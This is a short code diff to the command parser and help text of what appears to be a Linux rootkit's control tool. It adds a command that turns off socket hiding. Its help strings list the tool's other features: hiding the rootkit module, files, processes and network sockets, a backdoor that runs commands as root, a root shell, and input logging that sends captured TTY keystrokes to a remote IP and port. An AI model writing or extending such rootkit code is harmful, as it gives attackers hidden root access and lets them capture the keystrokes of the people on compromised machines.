@@ -118,6 +118,9 @@ parse_input(int argc, char **argv)
         }
     }
 
+    if (ARGVCMP(1, "sockethide-off"))
+        return (cmd_t){ handle_tcphide, (void *)0 };
+
     if (ARGVCMP(1, "backdoor")) {
         ASSERT_ARGC(2, "backdoor <execve_command>");
         return (cmd_t){ handle_backdoor, (void *)argv[2] };
@@ -263,12 +266,13 @@ help()
     printf("%-38s %s\n", "modhide <on | off>", "{,un}hide rootkit module");
     printf("%-38s %s\n", "filehide [open] <toggle | on | off>", "{,un}hide [open] files");
     printf("%-38s %s\n", "hidepid <add | rm> <PID>", "{,un}hide a process");
+    printf("%-38s %s\n", "socket hide <tcp | udp> <port>", "hide a tcp or udp with the given port");
+    printf("%-38s %s\n", "socket unhide <tcp | udp> <port>", "unhide a tcp or udp with the given port");
+    printf("%-38s %s\n", "sockethide-off", "disable any (tcp or udp) socket hiding");
     printf("%-38s %s\n", "backdoor <execve_command>", "exec a command as root");
     printf("%-38s %s\n", "shell", "obtain a shell as root");
     printf("%-38s %s\n", "backdoor-use-tty <0 | 1>", "listen for `make_me_root` on read (0) or TTY (1)");
     printf("%-38s %s\n", "backdoor-off", "disable any (read or tty) backdoor");
-    printf("%-38s %s\n", "socket hide <tcp|udp> <port>", "hide a tcp or udp with the given port");
-    printf("%-38s %s\n", "socket unhide <tcp|udp> <port>", "unhide a tcp or udp with the given port");
     printf("%-38s %s\n", "inputlogging <ip> <port>", "intercept {P,T}TY input and send it to <ip>:<port>");
     printf("%-38s %s\n", "inputlogging-off", "disable input logging");
 }
